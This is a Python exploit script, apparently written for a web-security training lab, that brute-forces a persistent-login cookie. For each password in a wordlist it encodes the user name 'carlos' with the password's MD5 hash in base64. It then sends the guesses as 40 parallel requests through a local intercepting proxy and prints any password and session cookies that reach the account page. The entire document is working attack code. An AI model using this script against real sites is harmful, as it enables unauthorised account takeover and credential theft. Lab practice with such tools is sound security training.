import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = sys.argv[1]

def get_req(url, headers,passwd):
    print("Trying: {0}".format(passwd),end="\r",flush=True)
    r = requests.get(url,headers=headers,proxies=proxies,verify=False)
    if("My account" in r.text):
        print(passwd)
        print(r.cookies)
    return r

file1 = open('creds/passwords1','r')
passwords = file1.readlines()

processes = []
with ThreadPoolExecutor(max_workers=40) as executor:
    for passwd in passwords:
        md5_val = hashlib.md5(passwd[:-1].encode('utf-8')).hexdigest()
        combined = "carlos:"+md5_val
        message_bytes = combined.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        headers = {'Cookie':'stay-logged-in='+  base64_message}
        processes.append(executor.submit(get_req,url,headers,passwd))

